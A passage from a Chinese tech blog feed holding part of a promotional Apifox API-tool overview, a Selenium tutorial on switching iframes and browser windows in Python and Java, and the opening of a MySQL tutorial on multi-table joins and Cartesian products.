src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p>5、“可视化”设置提取变量</p><p><img src="https://static.luozhinet.com/d5/c8ed6fd62f6451cf742a05d5b26622">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p>6、支持数据库操作</p><p><img src="https://static.luozhinet.com/7b/c633d7a622d9c321c31b7a56e092da">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p>7、“零配置”Mock 出非常人性化的数据</p><p>先放一张图对比下 Apifox 和其他同类工具 <code>零配置</code> mock 出来的数据效果：</p><p><img src="https://static.luozhinet.com/b7/d2f7e6b93896ed85d1a30af45560f0">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p>可以看出 Apifox <code>零配置</code> Mock 出来的数据和真实情况是非常接近的，前端开发可以直接使用，而无需再手动写 mock 规则。</p><p><strong>Apifox 如何做到<code>高效率</code>、<code>零配置</code>生成非常人性化的 mock 数据</strong></p><ol><li>Apifox 根据接口定义里的数据结构、数据类型，自动生成 mock 规则。</li><li>Apifox 内置智能 mock 规则库，根据字段名、字段数据类型，智能优化自动生成的 mock 规则。如：名称包含字符串<code>image</code>的<code>string</code>类型字段，自动 mock 出一个图片地址 URL；包含字符串<code>time</code>的<code>string</code>类型字段，自动 mock 出一个时间字符串；包含字符串<code>city</code>的<code>string</code>类型字段，自动 mock 出一个城市名。</li><li>Apifox 根据内置规则，可自动识别出图片、头像、用户名、手机号、网址、日期、时间、时间戳、邮箱、省份、城市、地址、IP 等字段，从而 Mock 出非常人性化的数据。</li><li>除了内置 mock 规则，用户还可以自定义规则库，满足各种个性化需求。支持使用 <code>正则表达式</code>、<code>通配符</code> 来匹配字段名自定义 mock 规则。</li></ol><p>8、生成在线接口文档</p><p>Apifox 项目可“在线分享” API 文档，分享出去的 API 文档可设置为公开或需要密码访问，非常方便与外部团队协作。</p><p>体验地址：<a href="https://www.apifox.cn/apidoc/shared-ce387612-cfdb-478a-b604-b96d1dbc511b/http/5041285" title="接口文档在线分享 - Apifox">接口文档在线分享 - Apifox</a></p><p><img src="https://static.luozhinet.com/15/2731f5e6878999f37b6a8215cdc39c">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p>9、代码自动生成</p><p>根据接口模型定义，自动生成各种语言&#x2F;框架（如 TypeScript、Java、Go、Swift、ObjectiveC、Kotlin、Dart、C++、C#、Rust 等）的业务代码（如 Model、Controller、单元测试代码等）和接口请求代码。目前 Apifox 支持 130 种语言及框架的代码自动生成。</p><p>更重要的是：你可以通过<code>自定义代码模板</code>来生成符合自己团队的架构规范的代码，满足各种个性化的需求。</p><p>10、导入、导出</p><ol><li>支持导出 <code>OpenApi (Swagger)</code>、<code>Markdown</code>、<code>Html</code> 等数据格式，因为可以导出<code>OpenApi</code>格式数据，所以你可以利用 OpenApi (Swagger) 丰富的生态工具完成各种接口相关的事情。</li><li>支持导入 <code>OpenApi (Swagger)</code>、<code>Postman</code>、<code>apiDoc</code>、<code>HAR</code>、<code>RAML</code>、<code>RAP2</code>、<code>YApi</code>、<code>Eolinker</code>、<code>NEI</code>、<code>DOClever</code>、<code>ApiPost</code> 、<code>Apizza</code> 、<code>ShowDoc</code>、<code>API Blueprint</code>、<code>I/O Docs</code>、<code>WADL</code>、<code>Google Discovery</code>等数据格式，方便旧项目迁移。</li><li>支持<code>定时自动</code>导入<code>OpenApi (Swagger)</code>、<code>apiDoc</code>、<code>Apifox</code>格式数据。</li></ol><h3 id="三、后续功能规划"><a href="#三、后续功能规划" class="headerlink" title="三、后续功能规划"></a>三、后续功能规划</h3><ol><li>发布 Apifox WEB 版，支持在浏览器端使用 Apifox。</li><li>接口性能测试支持（类似 JMeter）。</li><li>支持插件市场，可以自己开发插件。</li><li>开放 Apifox API，允许开发者通过 API 调用 Apifox 的功能。</li><li>支持更多接口协议，如<code>GraphQL</code>、<code>gRPC</code>、<code>websocket</code>等。</li><li>支持离线使用，项目可选择在线同步（团队协作）还是仅本地存储（单机离线使用）。</li></ol><h3 id="四、更多-Apifox-功能截图"><a href="#四、更多-Apifox-功能截图" class="headerlink" title="四、更多 Apifox 功能截图"></a>四、更多 Apifox 功能截图</h3><p><img src="https://static.luozhinet.com/df/95239a2d417eaf687d286897666d6e">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p><img src="https://static.luozhinet.com/43/68228d8402f5c6be470a27367ec6e2">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p><img src="https://static.luozhinet.com/46/daf2680c1ef4e36f5e616d61f447c2">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p><img src="https://static.luozhinet.com/12/10a5e0ba93b8efe0b58ea165d6b4a3">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p><img src="https://static.luozhinet.com/e7/1edb6bd710a77697f89aeadf11941e">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p><img src="https://static.luozhinet.com/85/5bc7b8c8f7c35737fc36520e9c700d">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p><img src="https://static.luozhinet.com/80/32dec1e430ae1713fb13d7b013fe79">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><h3 id="五、-Apifox-下载地址"><a href="#五、-Apifox-下载地址" class="headerlink" title="五、 Apifox 下载地址"></a>五、 Apifox 下载地址</h3><p>介绍了Apifox这么多实用的功能，用上了才是真福利！ 软件完全<strong>免费</strong>，堪称国产良心，有兴趣有需求的小伙伴，完全可以直接复制下面的链接，粘贴到浏览器打开即可下载！ 官网地址： <a href="https://www.apifox.cn/?utm_source=liam" title="www.apifox.cn">www.apifox.cn</a></p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 密码 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 免费 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 自动化 </tag>
            
            <tag> 地址 </tag>
            
            <tag> image </tag>
            
            <tag> java </tag>
            
            <tag> string </tag>
            
            <tag> 邮箱 </tag>
            
            <tag> 时间 </tag>
            
            <tag> 开发 </tag>
            
            <tag> 框架 </tag>
            
            <tag> apifox </tag>
            
            <tag> mock </tag>
            
            <tag> 接口 </tag>
            
            <tag> api </tag>
            
            <tag> 定义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页 frame 与多窗口处理</title>
      <link href="/posts/84e281d53601/"/>
      <url>/posts/84e281d53601/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="iframe解析"><a href="#iframe解析" class="headerlink" title="iframe解析"></a><a href="https://ceshiren.com/t/topic/20678#iframe-2"></a>iframe解析</h3><p><a href="https://ceshiren.com/uploads/default/original/3X/f/f/ffa917c3caaf65bf7648a934ec6411aa16be0619.png"><img src="https://static.luozhinet.com/65/73fcf16adcd310b2bc01723f3978eb"></a></p><p>1080×175 75.1 KB</p><p>如图可以看到iframe的标签</p><h3 id="iframe-的多种切换方式"><a href="#iframe-的多种切换方式" class="headerlink" title="iframe 的多种切换方式"></a><a href="https://ceshiren.com/t/topic/20678#iframe-3"></a>iframe 的多种切换方式</h3><p>HTML 代码示例</p><p><code>&lt;iframe src=&quot;1.html&quot; id=&quot;hogwarts_id&quot; name=&quot;hogwarts_name&quot;&gt;&lt;/iframe&gt;</code></p><p>那么通过传入 id、name、index 以及 Selenium 的 WebElement 对象来切换 frame</p><ul><li>Python 版本</li></ul><p><code># index：传入整型的参数，从 0 开始，这里的 0 就是第一个 frame driver.switch_to.frame(0)  #id：iframe 的 id driver.switch_to.frame(&quot;hogwarts_id&quot;)  #name: iframe 的 name driver.switch_to.frame(&quot;hogwarts_name&quot;)  #WebElement: 传入 `selenium.webelement` 对象 driver.switch_to.frame(driver.find_element_by_tag_name(&quot;iframe&quot;))</code></p><ul><li>Java 版本</li></ul><p><code>// index：传入整型的参数，从 0 开始，这里的 0 就是第一个 frame driver.switchTo().frame(0);  // id：iframe 的 id driver.switchTo().frame(&quot;hogwarts_id&quot;);  // name: iframe 的 name driver.switchTo().frame(&quot;hogwarts_name&quot;);  // WebElement: 传入 `selenium.webelement` 对象 driver.switchTo().frame(driver.findElement(By.tagName(&quot;iframe&quot;)));</code></p><h3 id="iframe-切换回默认页面"><a href="#iframe-切换回默认页面" class="headerlink" title="iframe 切换回默认页面"></a><a href="https://ceshiren.com/t/topic/20678#iframe-4"></a>iframe 切换回默认页面</h3><p>在切换页面之后，如果还想操作原页面，则可以使用</p><ul><li>Python 版本</li></ul><p><code>driver.switch_to.default_content()</code></p><ul><li>Java 版本</li></ul><p><code>driver.switchTo().defaultContent();</code></p><h3 id="iframe-多层切换"><a href="#iframe-多层切换" class="headerlink" title="iframe 多层切换"></a><a href="https://ceshiren.com/t/topic/20678#iframe-5"></a>iframe 多层切换</h3><p><img src="https://static.luozhinet.com/6c/bccb194649232f558b8afdb6761dcd"></p><p>如图所示多层嵌套的 iframe 从最外部 iframe 切换到 iframe2 则需要层层切换</p><ul><li>Python 版本</li></ul><p><code>driver.switch_to.frame(&quot;iframe1&quot;) driver.switch_to.frame(&quot;iframe2&quot;)</code></p><ul><li>Java 版本</li></ul><p><code>driver.switchTo().frame(&quot;iframe1&quot;); driver.switchTo().frame(&quot;iframe2&quot;);</code></p><p>从 iframe2 切换回 iframe1 可以使用父子切换</p><ul><li>Python 版本</li></ul><p><code># 从 iframe2 切换到上一级 iframe1  driver.switch_to.parent_frame() # 从 iframe1 切换到上一级 iframe，如果 iframe 已经是最上级，则保持不变 driver.switch_to.parent_frame()</code></p><ul><li>Java 版本</li></ul><p><code>// 从 iframe2 切换到上一级 iframe1 driver.switchTo().parentFrame(); // 从 iframe1 切换到上一级 iframe，如果 iframe 已经是最上级，则保持不变 driver.switchTo().parentFrame();</code></p><p>这个方法是 Selenium 提供的直接从子 frame 切换到父 frame，可以使用在嵌套的 frame 框架中。</p><h3 id="多窗口处理"><a href="#多窗口处理" class="headerlink" title="多窗口处理"></a><a href="https://ceshiren.com/t/topic/20678#h-6"></a>多窗口处理</h3><p>元素有属性，浏览器的窗口其实也有属性的，浏览器窗口的属性用句柄（handle）来识别。</p><h3 id="句柄的获取"><a href="#句柄的获取" class="headerlink" title="句柄的获取"></a><a href="https://ceshiren.com/t/topic/20678#h-7"></a>句柄的获取</h3><p>当浏览器打开一个窗口时，如果要在新的窗口操作就需要句柄切换。</p><p>当有多个窗口时，可以用 window_handles 打印句柄：</p><ul><li>Python 版本</li></ul><p><code>driver = webdriver.Chrome() handles = driver.window_handles print(handles)</code></p><ul><li>Java 版本</li></ul><p><code>driver = new ChromeDriver(); Set&lt;String&gt; handles = driver.getWindowHandles(); System.out.println(handles);</code></p><p>打印出的 window_handles:</p><p><code>[&#39;CDwindow-8012E9EF4DC788A58DC1588E7B8A7C44&#39;, &#39;CDwindow-11D52927C71E7C2B9984F2D1E2856049&#39;]</code></p><h3 id="句柄的切换"><a href="#句柄的切换" class="headerlink" title="句柄的切换"></a><a href="https://ceshiren.com/t/topic/20678#h-8"></a>句柄的切换</h3><p>通过打印 handles 可以看出，它是一个列表。</p><ul><li><p>Python版本可以通过 switch_to.window() 来切换句柄</p></li><li><p>Java版本可以通过 switchTo().window() 来切换句柄</p></li><li><p>Python 版本</p></li></ul><p><a href="https://static.luozhinet.com/34/7a21b459afb7c0c131a2f964c10f70"><img src="https://static.luozhinet.com/34/7a21b459afb7c0c131a2f964c10f70"></a></p><p>884×281 9.09 KB</p><p>从上面源代码中的说明可以看出，switch_to.window()需要提供一个 windows_name，可以是 name 也可以是 windows handle。</p><p><code>from selenium import webdriver  driver = webdriver.Chrome() handles = driver.window_handles print(handles) driver.switch_to.window(handles[-1])</code></p><p>这里唯一要注意的是 handles 是一个列表，这里的 -1 表示浏览器窗口的倒数第一个。</p><ul><li>Java 版本</li></ul><p><code>... Set&lt;String&gt; windowHandles = driver.getWindowHandles(); Iterator&lt;String&gt; it = windowHandles.iterator();   //迭代allhandle里面的句柄 while(it.hasNext()) &#123;                            //用it.hasNext()判断时候有下一个窗口,如果有就切换到下一个窗口     driver.switchTo().window(it.next());        //切换到新窗口 &#125; ... &#125;</code></p><p>Java 中切换句柄需要使用迭代器，如果有下一个句柄，则切换，没有则不切换，上面代码表示切换到最后一个窗口。</p><h2 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a><a href="https://ceshiren.com/t/topic/20678#h-9"></a>实战演示</h2><p>百度搜索“霍格沃兹测试学院”，点击“霍格沃兹测试学院_腾讯课堂”，点击“中高级测试开发「名企定向培养」班-霍格沃兹测试学院”。</p><p><a href="https://ceshiren.com/uploads/default/original/3X/b/e/be2f8d1dc775de3470935a0e12776d4a3db31793.png"><img src="https://static.luozhinet.com/62/105b8c36f5eb7f2dc5065e1649fa77"></a></p><p>854×468 177 KB</p><h3 id="python-代码"><a href="#python-代码" class="headerlink" title="python 代码"></a><a href="https://ceshiren.com/t/topic/20678#python-10"></a>python 代码</h3><p><code>from selenium import webdriver  class TestHogwarts:     def setup_method(self, method):         self.driver = webdriver.Chrome()         self.driver.implicitly_wait(3)      def teardown_method(self, method):         self.driver.quit()      def test_hogwarts(self):         self.driver.get(&#39;https://www.baidu.com&#39;)         #在输入框中输入霍格沃兹测试学院         self.driver.find_element_by_id(&#39;kw&#39;).send_keys(&#39;霍格沃兹测试学院&#39;)         #点击搜索         self.driver.find_element_by_css_selector(&#39;.s_btn&#39;).click()         #使用link_text点击         self.driver.find_element_by_link_text(&#39;关于我们 - 霍格沃兹测试学院&#39;).click()         #将获取到的window_handles赋值给一个变量handles         handles = self.driver.window_handles         #切换句柄         self.driver.switch_to.window(handles[-1])         assert len(self.driver.find_elements_by_css_selector(&#39;.ag-title-main&#39;)) == 1</code></p><h3 id="java代码"><a href="#java代码" class="headerlink" title="java代码"></a><a href="https://ceshiren.com/t/topic/20678#java-11"></a>java代码</h3><p><code>import org.junit.jupiter.api.AfterAll; import org.junit.jupiter.api.BeforeAll; import org.junit.jupiter.api.Test; import org.openqa.selenium.By; import org.openqa.selenium.chrome.ChromeDriver; import java.util.Iterator; import java.util.Set; import java.util.concurrent.TimeUnit; import static org.junit.jupiter.api.Assertions.assertEquals;  public class Web1Test &#123;     private static ChromeDriver driver;     @BeforeAll     public static void setUp()  &#123;         System.setProperty(                 &quot;webdriver.chrome.driver&quot;,                 &quot;/driver/chrome95/chromedriver&quot;         );         driver = new ChromeDriver();         driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);     &#125;     @AfterAll     public static void tearDown()  &#123;         driver.quit();     &#125;     @Test     public void hogwartsTest()&#123;         driver.get(&quot;https://www.baidu.com&quot;);         // 在输入框中输入霍格沃兹测试学院         driver.findElement(By.id(&quot;kw&quot;)).sendKeys(&quot;霍格沃兹测试学院&quot;);         // 点击搜索         driver.findElement(By.cssSelector(&quot;.s_btn&quot;)).click();         // 使用link_text点击         driver.findElement(By.linkText(&quot;关于我们 - 霍格沃兹测试学院&quot;)).click();         // 将获取到的window_handles赋值给一个变量handles         Set&lt;String&gt; windowHandles = driver.getWindowHandles();         // 切换句柄         //迭代allhandle里面的句柄         Iterator&lt;String&gt; it = windowHandles.iterator();            //用it.hasNext()判断时候有下一个窗口,如果有就切换到下一个窗口         while(it.hasNext()) &#123;                    //切换到新窗口                                  driver.switchTo().window(it.next());                &#125;         int size = driver.findElements(By.cssSelector(&quot;.ag-title-main&quot;)).size();         assertEquals(1,size);     &#125; &#125;</code></p><p>需要注意的是，把被测浏览器对应版本的 chromedriver 放置到某个路径下，配置到环境变量或者脚本代码中。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 标签 </tag>
            
            <tag> int </tag>
            
            <tag> new </tag>
            
            <tag> java </tag>
            
            <tag> public </tag>
            
            <tag> import </tag>
            
            <tag> self </tag>
            
            <tag> 默认 </tag>
            
            <tag> ment </tag>
            
            <tag> 框架 </tag>
            
            <tag> util </tag>
            
            <tag> void </tag>
            
            <tag> driver </tag>
            
            <tag> iframe </tag>
            
            <tag> 切换 </tag>
            
            <tag> handles </tag>
            
            <tag> switchto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql多表查询 浅谈mysql中等值连接与非等值连接、自连接与非自连接、内连接与外连接问题（一）</title>
      <link href="/posts/d8f19457f480/"/>
      <url>/posts/d8f19457f480/</url>
      
        <content type="html"><![CDATA[<h1 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h1><p>多表查询，也称为关联查询，指两个或更多个表一起完成查询操作。</p><p>前提条件：这些一起查询的表之间是有关系的（一对一、一对多），它们之间一定是有关联字段，这个</p><p>关联字段可能建立了外键，也可能没有建立外键。比如：员工表和部门表，这两个表依靠“部门编号”进</p><p>行关联。</p><h2 id="1-一个案例引发的多表连接"><a href="#1-一个案例引发的多表连接" class="headerlink" title="1. 一个案例引发的多表连接"></a><strong>1.</strong> <strong>一个案例引发的多表连接</strong></h2><h3 id="1-1案例说明"><a href="#1-1案例说明" class="headerlink" title="1.1案例说明"></a>1.1案例说明</h3><p><img src="https://static.luozhinet.com/dc/61d218240db3024428d5dee76b2150" alt="image"></p><p>从多个表中获取数据：</p><p><img src="https://static.luozhinet.com/79/0dfa976c1a11506324ec7e445bac89" alt="image"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#案例：查询员工的姓名及其部门名称</span><br><span class="line"><span class="keyword">SELECT</span> last_name, department_name</span><br><span class="line"><span class="keyword">FROM</span> employees, departments;</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/72/b9514a862565c3ed704d365c7b40ce" alt="image"></p><p>查询结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-----------+----------------------+</span></span><br><span class="line"><span class="operator">|</span> last_name <span class="operator">|</span> department_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------------------+</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Administration <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Marketing <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Purchasing <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Human Resources <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Shipping <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> IT <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Public Relations <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Sales <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Executive <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Finance <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Accounting <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> King <span class="operator">|</span> Treasury <span class="operator">|</span></span><br><span class="line">...</span><br><span class="line"><span class="operator">|</span> Gietz <span class="operator">|</span> IT Support <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Gietz <span class="operator">|</span> NOC <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Gietz <span class="operator">|</span> IT Helpdesk <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Gietz <span class="operator">|</span> Government Sales <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Gietz <span class="operator">|</span> Retail Sales <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Gietz <span class="operator">|</span> Recruiting <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Gietz <span class="operator">|</span> Payroll <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------------------+</span></span><br><span class="line"><span class="number">2889</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><p>分析错误情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(employee_id) <span class="keyword">FROM</span> employees;</span><br><span class="line">#输出<span class="number">107</span>行</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(department_id)<span class="keyword">FROM</span> departments;</span><br><span class="line">#输出<span class="number">27</span>行</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">107</span><span class="operator">*</span><span class="number">27</span> <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们把上述多表查询中出现的问题称为：笛卡尔积的错误。</p><h3 id="1-2笛卡尔积（或交叉链接）的理解"><a href="#1-2笛卡尔积（或交叉链接）的理解" class="headerlink" title="1.2笛卡尔积（或交叉链接）的理解"></a>1.2笛卡尔积（或交叉链接）的理解</h3><p>笛卡尔乘积是一个数学运算。假设我有两个集合 X 和 Y，那么 X 和 Y 的笛卡尔积就是 X 和 Y 的所有可能 组合，也就是第一个对象来自于 X，第二个对象来自于 Y 的所有可能。组合的个数即为两个集合中元素 个数的乘积数。</p><p><img src="https://static.luozhinet.com/50/ee87dab85496a095ca93abb6f9d57c" alt="image"></p><p>笛卡尔积也称为 交叉连接 ，英文是 CROSS JOIN。在 SQL99 中也是使用 CROSS JOIN表示交 叉连接。它的作用就是可以把任意表进行连接，即使这两张表不相关。在MySQL中如下情况会出现笛卡 尔积：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#出现了笛卡尔积的错误</span><br><span class="line">#错误的原因：缺少了多表的连接条件</span><br><span class="line"></span><br><span class="line">#错误的实现方式：每个员工和每个部门都匹配了一遍</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees,departments;#查询出来<span class="number">2889</span>条记录</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,departmant_name</span><br><span class="line"><span class="keyword">FROM</span> employees <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> departments;#查询出<span class="number">2899</span>条记录</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> employees;  #<span class="number">107</span>条记录</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">2889</span> <span class="operator">/</span> <span class="number">107</span></span><br><span class="line"><span class="keyword">FROM</span> DUAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> departments; #<span class="number">27</span>条记录</span><br></pre></td></tr></table></figure><h3 id="1-3案例分析与问题解决"><a href="#1-3案例分析与问题解决" class="headerlink" title="1.3案例分析与问题解决"></a>1.3案例分析与问题解决</h3><ul><li><p>笛卡尔积的错误会在下面条件下产生：</p><ul><li>省略多个表的连接条件（或关联条件）</li><li>连接条件（或关联条件）无效</li><li>所有表中的所有行互相连接</li></ul></li><li><p>为了避免笛卡尔积， 可以在 WHERE 加入有效的连接条件。</p></li><li><p>加入连接条件后，查询语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table1.column, table2.column</span><br><span class="line"><span class="keyword">FROM</span> table1, table2</span><br><span class="line"><span class="keyword">WHERE</span> table1.column1 <span class="operator">=</span> table2.column2; #连接条件</span><br></pre></td></tr></table></figure><ul><li>在 WHERE子句中写入连接条件。</li></ul></li><li><p>正确写法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">3.</span>多表查询的正确方式：需要有连接条件</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees,departments</span><br><span class="line">#两个表的连接条件</span><br><span class="line"><span class="keyword">WHERE</span> employees.department_id <span class="operator">=</span> departments.department_id;</span><br></pre></td></tr></table></figure><ul><li>在表中有相同列时，在列名之前加上表名前缀。</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">4.</span>如果查询语句中出现了多个表中都存在的字段，则不许知名此字段所在的表</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name,department_id</span><br><span class="line"><span class="keyword">FROM</span> employees,departments</span><br><span class="line"><span class="keyword">WHERE</span> employees.department_id <span class="operator">=</span> departments.department_id;</span><br><span class="line"></span><br><span class="line">[<span class="keyword">SQL</span>] <span class="keyword">SELECT</span> employee_id,department_name,department_id</span><br><span class="line"><span class="keyword">FROM</span> employees,departments</span><br><span class="line"><span class="keyword">WHERE</span> employees.department_id <span class="operator">=</span> departments.department_id;</span><br><span class="line">[Err] <span class="number">1052</span> <span class="operator">-</span> <span class="keyword">Column</span> <span class="string">&#x27;department_id&#x27;</span> <span class="keyword">in</span> field list <span class="keyword">is</span> ambiguous</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#如果给表起了别名，一旦在<span class="keyword">SELECT</span>或<span class="keyword">WHERE</span>中使用表明的话，则必须使用表的别名，而不能再使用表的原名</span><br><span class="line">#如下的操作是错误的</span><br><span class="line"><span class="keyword">SELECT</span> emp.employee_id,dept.department_name,emp.department_id</span><br><span class="line"><span class="keyword">FROM</span> employees emp,departments dept</span><br><span class="line"><span class="keyword">WHERE</span> emp.department_id <span class="operator">=</span> departments.department_id;</span><br><span class="line"></span><br><span class="line">[<span class="keyword">SQL</span>] <span class="keyword">SELECT</span> emp.employee_id,dept.department_name,emp.department_id</span><br><span class="line"><span class="keyword">FROM</span> employees emp,departments dept</span><br><span class="line"><span class="keyword">WHERE</span> emp.department_id <span class="operator">=</span> departments.department_id;</span><br><span class="line">[Err] <span class="number">1054</span> <span class="operator">-</span> <span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;departments.department_id&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;where clause&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-多表查询分类讲解"><a href="#2-多表查询分类讲解" class="headerlink" title="2. 多表查询分类讲解"></a>2. 多表查询分类讲解</h2><h3 id="分类1：等值连接-vs-非等值连接"><a href="#分类1：等值连接-vs-非等值连接" class="headerlink" title="分类1：等值连接 vs 非等值连接"></a>分类1：等值连接 vs 非等值连接</h3><h4 id="等值连接"><a href="#等值连接" class="headerlink" title="等值连接"></a>等值连接</h4><p><img src="https://static.luozhinet.com/25/435983fe706a925965e6aa601c902c" alt="image"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span 